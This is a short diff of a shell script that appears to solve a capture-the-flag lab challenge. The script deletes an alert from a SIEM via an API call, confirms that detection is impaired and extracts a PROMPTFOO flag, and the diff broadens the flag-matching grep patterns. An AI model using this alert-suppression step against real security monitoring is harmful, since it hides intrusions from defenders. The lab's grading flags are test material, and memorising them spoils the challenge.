@@ -11,9 +11,9 @@ aid="$(curl -s "$BASE/siem/events" | python3 -c 'import sys,json;print(next(e["i
 echo "    alert_id=$aid"
 
 echo "[*] stage 1 — suppress the alert from the SIEM pipeline ->"
-curl -s "$BASE/siem/delete?event_id=$aid" | grep -o 'PROMPTFOO{s7a[^}]*}' | head -n1 || true
+curl -s "$BASE/siem/delete?event_id=$aid" | grep -o 'PROMPTFOO{[^}]*}' | head -n1 || true
 
 echo "[*] stage 2 — SIEM reports detection impaired ->"
-flag="$(curl -s "$BASE/siem/status" | grep -o 'PROMPTFOO{s7_siem[^}]*}' | head -n1)"
+flag="$(curl -s "$BASE/siem/status" | grep -o 'PROMPTFOO{[^}]*}' | head -n1)"
 [ -n "$flag" ] || { echo "[!] flag not recovered" >&2; exit 1; }
 echo "$flag"
